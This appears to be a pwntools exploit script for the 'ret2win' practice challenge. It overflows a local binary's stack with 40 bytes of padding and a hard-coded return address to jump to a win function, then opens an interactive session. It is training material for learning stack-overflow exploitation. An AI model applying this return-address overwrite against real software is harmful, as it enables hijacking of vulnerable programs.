from pwn import *
import sys

def main():
    # elf = ELF(str("./ret2win"), checksec = False)
    chall = process("./ret2win")
    # chall = gdb.debug("./ret2win")

    initialJunk = b"A"*40
    payload = p64(0x0000000000400764)
    sys.stdout.buffer.write(initialJunk + payload)
    chall.sendlineafter(b"> ", initialJunk+payload)
    # print(chall.recvuntil(b"flag\n", timeout = 1))
    # print(chall.recvline(timeout = 1))
    chall.interactive()

if __name__ == "__main__":
    main()
